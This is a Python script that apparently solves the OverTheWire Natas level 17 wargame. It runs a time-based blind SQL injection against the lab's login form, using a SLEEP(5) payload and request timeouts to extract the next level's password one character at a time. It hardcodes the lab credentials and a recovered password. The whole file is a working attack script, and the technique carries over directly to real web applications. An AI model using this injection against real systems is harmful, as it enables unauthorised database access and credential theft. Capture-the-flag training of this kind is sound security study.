import requests
# import sys
from string import digits, ascii_letters
from threading import Thread
# import time
charset         = ascii_letters + digits
url             = 'http://natas17.natas.labs.overthewire.org/'
natas_username  = 'natas17'
natas_password  = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

sqli = 'natas18" AND password LIKE BINARY "{}" AND SLEEP(5)-- '

brower      = requests.Session()
brower.auth = (natas_username, natas_password)

hacked_password = ""
def exploit(char):
    global hacked_password
    try:
        payload = sqli.format(hacked_password+char+"%")
        post_data = {'username': payload}
        r = brower.post(url, data=post_data, timeout=1)
    except requests.Timeout:
        hacked_password += char
        print(char, end='')

print('Scanning...\n')
# We assume that the password is 32 chars
while len(hacked_password) < 32:
    CHECK = len(hacked_password)
    for char in charset:
        if len(hacked_password) == CHECK:
            Thread(target=exploit, args={char}).run()
        else:
            break
    while CHECK == len(hacked_password):
        pass

# print(hacked_password)
#xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
